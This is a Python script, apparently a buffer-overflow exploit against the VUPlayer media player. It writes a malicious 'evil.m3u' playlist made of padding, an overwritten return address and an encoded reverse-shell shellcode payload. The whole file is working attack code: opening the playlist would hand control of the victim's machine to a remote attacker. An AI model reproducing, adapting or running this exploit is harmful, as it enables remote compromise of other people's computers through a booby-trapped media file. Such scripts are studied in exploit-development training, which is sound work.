#!/usr/bin/python

#badchars: 0x00, 0x09, \x0a, \x1a
#!mona bytearray -cpb "\x00\x09\x0a\x1a"
import subprocess
import os

shellcode_reverse_shell =  b""
shellcode_reverse_shell += b"\x33\xc9\x66\xb9\x43\x01\xe8\xff"
shellcode_reverse_shell += b"\xff\xff\xff\xc1\x5e\x30\x4c\x0e"
shellcode_reverse_shell += b"\x07\xe2\xfa\xfd\xea\x81\x04\x05"
shellcode_reverse_shell += b"\x06\x67\x81\xec\x3b\xcb\x68\x86"
shellcode_reverse_shell += b"\x5e\x3f\x9b\x43\x1e\x98\x46\x01"
shellcode_reverse_shell += b"\x9d\x65\x30\x16\xad\x51\x3a\x2c"
shellcode_reverse_shell += b"\xe1\xb3\x1c\x40\x5e\x21\x08\x05"
shellcode_reverse_shell += b"\xe7\xe8\x25\x28\xed\xc9\xde\x7f"
shellcode_reverse_shell += b"\x79\xa4\x62\x21\xb9\x79\x08\xbe"
shellcode_reverse_shell += b"\x7a\x26\x40\xda\x72\x3a\xed\x6c"
shellcode_reverse_shell += b"\xb5\x66\x60\x40\x91\xc8\x0d\x5d"
shellcode_reverse_shell += b"\xa5\x7d\x01\xc2\x7e\xc0\x4d\x9b"
shellcode_reverse_shell += b"\x7f\xb0\xfc\x90\x9d\x5e\x55\x92"
shellcode_reverse_shell += b"\x6e\xb7\x2d\xaf\x59\x26\xa4\x66"
shellcode_reverse_shell += b"\x23\x7b\x15\x85\x3a\xe8\x3c\x41"
shellcode_reverse_shell += b"\x67\xb4\x0e\xe2\x66\x20\xe7\x35"
shellcode_reverse_shell += b"\x72\x6e\xa3\xfa\x76\xf8\x75\xa5"
shellcode_reverse_shell += b"\xff\x33\x5c\x5d\x21\x20\x1d\x24"
shellcode_reverse_shell += b"\x24\x2e\x7f\x61\xdd\xdc\xde\x0e"
shellcode_reverse_shell += b"\x94\x6c\x05\xd4\xe2\xb8\xbe\x8d"
shellcode_reverse_shell += b"\x8e\xe7\xe7\xe2\xa0\xcc\xc0\xfd"
shellcode_reverse_shell += b"\xda\xe0\xbe\x9e\x65\x4e\x24\x0d"
shellcode_reverse_shell += b"\x9f\x9f\xa0\x88\x66\xf7\xf4\xcd"
shellcode_reverse_shell += b"\x8f\x27\xc3\xa9\x55\x7e\xfc\xfd"
shellcode_reverse_shell += b"\xfe\xff\xf0\xe1\xf2\xe3\xdc\x5f"
shellcode_reverse_shell += b"\xb9\x68\x58\x46\x6f\x2c\xd6\xb8"
shellcode_reverse_shell += b"\xd6\x7f\x68\xc0\x41\xab\xc6\xc5"
shellcode_reverse_shell += b"\xd7\x9b\x41\x2f\xa0\xdb\x9a\x9a"
shellcode_reverse_shell += b"\xa6\x56\x75\xa5\xb3\x2c\x01\x50"
shellcode_reverse_shell += b"\x16\xa3\xd4\x26\x94\xd3\xa9\x31"
shellcode_reverse_shell += b"\xb6\x2f\x55\x43\xb4\x1c\x31\x8d"
shellcode_reverse_shell += b"\x85\x8a\x8c\xe9\x63\x08\xbb\xba"
shellcode_reverse_shell += b"\xb9\xde\x06\x9b\xe0\xaa\xa2\x17"
shellcode_reverse_shell += b"\x0b\x91\x3f\xbd\xde\xc7\xfd\xfc"
shellcode_reverse_shell += b"\x73\xbb\x24\x11\xc4\x03\x40\x51"
shellcode_reverse_shell += b"\x56\x51\x5e\x5f\x4c\x5d\x42\x5b"
shellcode_reverse_shell += b"\x58\x5c\x46\x79\x6b\xdf\x2b\x93"
shellcode_reverse_shell += b"\xe9\xc2\x91\xf9\x54\x4d\x5a\xe2"
shellcode_reverse_shell += b"\x2e\x77\x28\xa6\x3f\x43\xdb\xf0"
shellcode_reverse_shell += b"\x9d\xc7\x35\x03\x20\x43\x8a\xb8"
shellcode_reverse_shell += b"\x93\xb2\xcf\xe4\x0e\x35\x48\x3f"
shellcode_reverse_shell += b"\xb6\xcc\xd8\x4c\x3f\x80\x7b\x2e"
shellcode_reverse_shell += b"\x4c\x50\x2a\x41\x11\xbc\x91"

print("vuplayer_exploit v1.0 by Carlos\n")

shellcode = '\x41' * 1012 # padding
shellcode += '\x9F\x53\x10\x10' # ret addr 0x1010539F
shellcode += shellcode_reverse_shell

print("\nfile content (size " + str(len(shellcode))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode))

f = open('evil.m3u', 'wb')

f.write(shellcode)

f.close()



